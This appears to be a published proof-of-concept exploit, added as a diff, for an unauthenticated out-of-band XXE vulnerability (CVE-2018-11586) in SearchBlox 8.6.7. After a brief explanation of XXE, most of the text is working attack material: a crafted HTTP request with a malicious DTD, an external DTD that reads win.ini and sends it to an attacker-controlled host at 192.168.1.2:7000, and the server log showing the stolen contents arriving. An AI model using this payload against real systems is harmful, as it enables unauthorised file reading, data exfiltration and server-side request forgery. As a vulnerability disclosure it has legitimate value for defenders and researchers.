@@ -1,0 +1,68 @@
+# Exploit Title: SearchBlox 8.6.7 Out-Of-Band XML eXternal Entity (OOB-XXE)
+# Exploit Author: Ahmet GUREL, Canberk BOLAT
+# Software Link: https://www.searchblox.com/
+# Version: < = SearchBlox Version 8.6.7
+# Platform: Java
+# Tested on: Windows
+# CVE: CVE-2018-11586
+
+# 1. DETAILS
+
+An XML External Entity attack is a type of attack against an
+application that parses XML input. This attack occurs when XML input
+containing a reference to an external entity is processed by a weakly
+configured XML parser. This attack may lead to the disclosure of
+confidential data, denial of service, server side request forgery,
+port scanning from the perspective of the machine where the parser is
+located, and other system impacts. Reference:
+https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+
+# 2. PoC:
+
+XML external entity (XXE) vulnerability in /searchblox/api/rest/status in
+SearchBlox 8.6.7 allows remote unauthenticated users to read arbitrary
+files or conduct server-side request forgery (SSRF) attacks via a crafted
+DTD in an XML request.
+
+HTTP Request:
+_____________
+
+GET /searchblox/api/rest/status HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=n9uolja8nwkj15nsv66xjlzci;
+XSRF-TOKEN=6098a021-0e3c-409f-9da0-b895eff3025d; AdsOnPage=5;
+AdsOnSearchPage=5
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 140
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE xxe [
+ <!ENTITY % dtd SYSTEM "http://192.168.1.2:7000/ext.dtd">
+%dtd;
+%all;
+%send;]>
+
+#Ext.dtd File :
+_______________
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///C:/windows/win.ini">
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://192.168.1.2:7000/?%file;
+'>">
+%all;
+
+#HTTP Response:
+_______________
+
+Ahmets-MacBook-Pro:Desktop ahmet$ python -m SimpleHTTPServer 7000
+Serving HTTP on 0.0.0.0 port 7000 ...
+192.168.1.2 - - [03/Jun/2018 15:37:16] "GET /ext.dtd HTTP/1.1" 200 -
+192.168.1.2 - - [03/Jun/2018 15:37:16] "GET
+/?;%20for%2016-bit%20app%20support%20[fonts]%20[extensions]%20[mci%20extensions]%20[files]%20[Mail]%20MAPI=1
+HTTP/1.1" 200 -
